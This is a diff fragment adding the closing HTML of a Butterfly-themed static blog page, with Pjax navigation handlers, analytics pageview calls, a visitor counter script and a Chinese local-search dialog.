+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
